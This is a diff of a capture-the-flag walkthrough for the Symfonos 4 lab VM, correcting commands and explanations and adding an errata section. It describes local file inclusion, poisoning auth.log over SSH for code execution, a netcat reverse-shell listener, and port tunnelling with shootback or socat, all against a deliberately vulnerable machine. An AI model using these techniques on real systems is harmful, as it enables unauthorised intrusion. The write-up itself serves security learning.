@@ -15,7 +15,7 @@ For the purposes of this walkthrough, I have three machines running:
 We launch Symfonos in our favorite virtualization environment and we get to work. As always, we begin with a basic `nmap` to see what's going on with the virtual machine. The IP address is (conveniently) displayed on the login screen of the VM's TTY. How nice!
 
     ┌─[kazwolfe@Starblade]                                   
-    └─> $ nmap 192.168.56.108 -A -p-
+    └─> $ nmap 192.168.56.108 -A 
         Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-24 11:49 PDT
     Nmap scan report for 192.168.56.108
     Host is up (0.0014s latency).
@@ -75,7 +75,7 @@ This screams that we can do a local file inclusion, so let's try some. Before we
 
 Indeed we can! We'll ignore the odd permissions on `/var/log/auth.log` and continue. We can poke around a bit and find other logs - like `dpkg.log`. Nothing of note, but it's at least something. It's also worth trying an RFI, but that doesn't work either. We're kinda stumped. We take a wild shot in the dark and assume that `sea.php` is including these files with an [`include()`](https://www.php.net/manual/en/function.include.php), meaning we have a potential for arbitrary code execution.
 
-We have (limited) control over a single specific log: `auth.log`. Any failed login attempts will generate a new entry into the logfile. A quick SSH attempt as the user `chicken` confirms this:
+We have (limited) control over a single specific log: `auth.log`. Any failed login attempts will generate a new entry into the logfile. A quick SSH attempt as the user [`chicken`](https://isotropic.org/papers/chicken.pdf) confirms this:
 
     Aug 23 19:09:01 symfonos4 CRON[2317]: pam_unix(cron:session): session opened for user root by (uid=0)
     Aug 23 19:09:01 symfonos4 CRON[2317]: pam_unix(cron:session): session closed for user root
@@ -101,7 +101,7 @@ Next, we need to get this file on to the target machine. In order to do this, we
 
 > **The Simple HTTP Server**
 > 
-> For those not in the know, you can spawn a tiny webserver on any system with Python 3 installed by running `python 3 -m http.server`. Your current directory will be served to the world at port 8000, and you can freely grab files by making a request.
+> For those not in the know, you can spawn a tiny webserver on any system with Python 3 installed by running `python3 -m http.server`. Your current directory will be served to the world at port 8000, and you can freely grab files by making a request.
 > 
 > Insanely handy, and readily available! What's better than that?
 
@@ -122,7 +122,7 @@ But perhaps permissions are wrong? What if we write to a known-writable location
     
 We navigate to `http://192.158.56.108/sea.php?file=../../../../../../tmp/rsh` and pop back over to our netcat listener.
 
-    root@kali:/tmp/asdfa# nc -lvp 1234
+    root@kali /tmp/asdfa # nc -lvp 1234
     listening on [any] 1234 ...
     192.168.56.108: inverse host lookup failed: Unknown host
     connect to [192.168.56.102] from (UNKNOWN) [192.168.56.108] 39820
@@ -159,21 +159,21 @@ So, sidetrack aside, we start with our recon. As `netstat` isn't installed on th
     tcp     LISTEN   0        128                    *:80                  *:*      
     tcp     LISTEN   0        128                 [::]:22               [::]:*  
     
-A webserver on 8080! Interesting. This didn't show up on our Nmap scan, so there's a firewall on this machine. It's there, it's annoying, and we can't do anything about it.
+A webserver on 8080! Interesting. This didn't show up on our Nmap scan, as it's binding to localhost. Therefore, we can't really connect to it (much like MySQL as well) nor can we modify the bind configs as that's controlled in a file owned by `root`.
 
-Except... we can. For this CTF, I opted to use [`shootback`](https://github.com/aploium/shootback), and open source and (pretty) friendly reverse TCP tunnel.
+Except... we can. For this CTF, I opted to use [`shootback`](https://github.com/aploium/shootback), and open source and (pretty) friendly reverse TCP tunnel. Tools like this would bypass any firewalls on the host system (in this case, there weren't any, but we aren't always as lucky). Other tools like [`socat`](https://linux.die.net/man/1/socat) could have been used as well (e.g. `socat TCP-LISTEN:8001,fork,reuseaddr tcp:127.0.0.1:8080 &`), which would have probably simplified the below steps. Use whichever you like more.
 
 We'll clone the repo to our Kali machine, build the slaver, and get that ready to be copied over:
 
-    root@kali:/tmp/sym4# git clone https://github.com/aploium/shootback.git
+    root@kali /tmp/sym4 # git clone https://github.com/aploium/shootback.git
     Cloning into 'shootback'...
     < ... >
     Resolving deltas: 100% (161/161), done.
-    root@kali:/tmp/sym4# cd shootback
-    root@kali:/tmp/sym4/shootback# python3 ./build_singlefile_slaver.py 
+    root@kali /tmp/sym4 # cd shootback
+    root@kali /tmp/sym4/shootback # python3 ./build_singlefile_slaver.py 
     generate complete!
     output file: /tmp/sym4/shootback/slaver_singlefile.py
-    root@kali:/tmp/sym4/shootback# mv slaver_singlefile.py ../slaver.py
+    root@kali /tmp/sym4/shootback # mv slaver_singlefile.py ../slaver.py
     
 Our HTTP server is still running, so let's copy that over. On our reverse shell:
 
@@ -247,3 +247,13 @@ This was a really fun CTF overall, and I enjoyed it immensely. There's probably 
 I did, however, run into a very annoying issue that forced me to restart the CTF. If bad PHP code is injected in to `auth.log` via SSH, you can potentially lose that entrypoint entirely. This is not a fun feeling, but I'm sure there's some realistic way around this. I just never found it.
 
 If you have any suggestions for how I could do this CTF better, have any CTFs you want me to waste time on, or just want to chat to me about security in general, feel free to ping me [on Keybase](https://keybase.io/kazwolfe), send a message to me [on Discord](https://discord.gg/y56NMeW), or whatever you find. Consider it a challenge. 
+
+### Errata
+
+After the initial publishing of this article to GitHub, a number of errata surfaced that I'd like to resolve:
+
+* The `nmap` command in Part 1 contains a `-p-` flag while the scan only shows the top 1000 ports being scanned. This was a result of me attempting to quickly redo the CTF - I typed the initial command I used (with `-p-`), but used the output from a standard `-A` run of `nmap`.
+* I incorrectly identified the reason port 8080 was not open was due to a firewall. Instead, the port in question was bound to 127.0.0.1, meaning I could not connect to it from any other IP address. This was a procedural problem on my part, as I never checked if I could use tools to bind other ports. Thanks for pointing this out, @barghest89! 
+* A typographical error in the cutout for SimpleHTTPServer included a stray space between `python` and `3`, which may have confused some people.
+* An easter egg-ish link I was planning to include was omitted from initial publication.
+* Shell prompts for my systems were inconsistent. This was caused by switching between `bash` and `xonsh` on my Kali system for various parts of the CTF. All prompts have been fixed to the `xonsh` format.
